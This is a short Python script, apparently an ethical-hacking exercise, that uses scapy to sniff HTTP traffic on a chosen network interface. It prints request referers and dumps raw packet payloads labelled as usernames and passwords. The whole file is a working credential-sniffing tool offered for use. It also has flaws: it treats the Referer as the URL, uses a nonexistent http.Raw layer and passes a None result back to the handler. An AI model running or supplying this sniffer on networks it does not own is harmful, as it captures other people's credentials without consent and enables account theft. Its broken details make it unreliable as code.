import argparse
import scapy.all as scapy
from scapy.layers import http


def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="Use is to select interface through which data needs to be sniffed.")
    argument = parser.parse_args()
    return argument.interface


def sniffer(interface):
    scapy.sniff(iface=interface, store=False,
                prn=sniffed_packets)  # prn is used to redirect us to certain function that will be executed once scapy has sniffed packet
    # prn is used to redirect us to certain function that will be executed once scapy has sniffed packet
    # sniff is a fundtion inside scapy#store =False says that i don't need to store information in my memory instead just show it


def sniffed_packets(packets):
    if packets.haslayer(
            http.HTTPRequest):  # Acessing layer through haslayer#HTTP is a class of layer used from scapy which has been imported  shown above.
        # HTTPRequest is a layer which needs to be accessed if present will be present in most cases
        print("URL<<<<----",
              packets.Referer)  # printing an attribute named Referer inside layer HTTPRequest present in class HTTP
        if packets.haslayer(http.Raw):
            print("\nUsername & Password-->>>>", packets.load, "\n")


interface = parser()
packets = sniffer(interface)
sniffed_packets(packets)
